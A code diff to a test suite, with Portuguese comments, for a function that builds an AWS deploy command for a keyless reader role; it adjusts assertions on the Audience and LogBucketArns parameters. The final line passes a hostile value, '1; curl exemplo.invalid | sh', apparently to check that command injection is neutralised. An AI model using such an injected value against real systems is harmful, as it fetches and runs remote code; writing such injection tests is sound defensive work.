@@ -122,8 +122,9 @@ describe('papel de leitura sem chave (PR-V3)', () => {
     });
     expect(command).toContain(`NodeServiceAccountId=${NODE_SERVICE_ACCOUNT_ID_PLACEHOLDER} \\`);
     expect(command).toContain(`NodeEgressIps=${NODE_EGRESS_IPS_PLACEHOLDER} \\`);
-    expect(command.endsWith(`Audience=${AWS_READER_AUDIENCE}`)).toBe(true);
-    expect(command).not.toContain('LogBucketArns');
+    expect(command).toContain(`Audience=${AWS_READER_AUDIENCE} \\`);
+    // Sem bucket, o LogBucketArns vai vazio: o mesmo comando, numa pilha que já existe, tira os buckets antigos.
+    expect(command.endsWith('LogBucketArns=""')).toBe(true);
 
     const hostile = awsReaderDeployCommand({
       nodeServiceAccountId: '1; curl exemplo.invalid | sh',
